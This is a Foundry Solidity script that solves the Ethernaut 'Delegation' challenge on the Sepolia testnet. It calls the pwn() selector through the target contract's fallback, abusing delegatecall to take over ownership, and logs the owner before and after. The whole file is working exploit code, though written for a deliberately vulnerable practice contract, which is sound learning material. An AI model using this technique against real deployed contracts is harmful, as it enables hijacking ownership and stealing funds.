// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface IDelegate {
    function pwn() external;
}
interface IDelegation {
    function owner() external returns (address);
}

//forge script  --rpc-url sepolia --account metamask  Cracked6_DelegationScript --broadcast
contract Cracked6_DelegationScript is Script {
    address ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("Delegation_address"));
    }
    function run() public {
        vm.startBroadcast();
        address player = vm.parseAddress(vm.envString("player"));
        address oldOwner = IDelegation(ethernaut_contracts).owner();
        console.log("oldOwner is", oldOwner);

        (bool success, ) = ethernaut_contracts.call(abi.encodeWithSelector(IDelegate.pwn.selector));
        require(success, "call fail");

        address newOwner = IDelegation(ethernaut_contracts).owner();
        console.log("newOwner is", newOwner);
        require(newOwner == player, "guess fail");
        vm.stopBroadcast();
    }
}
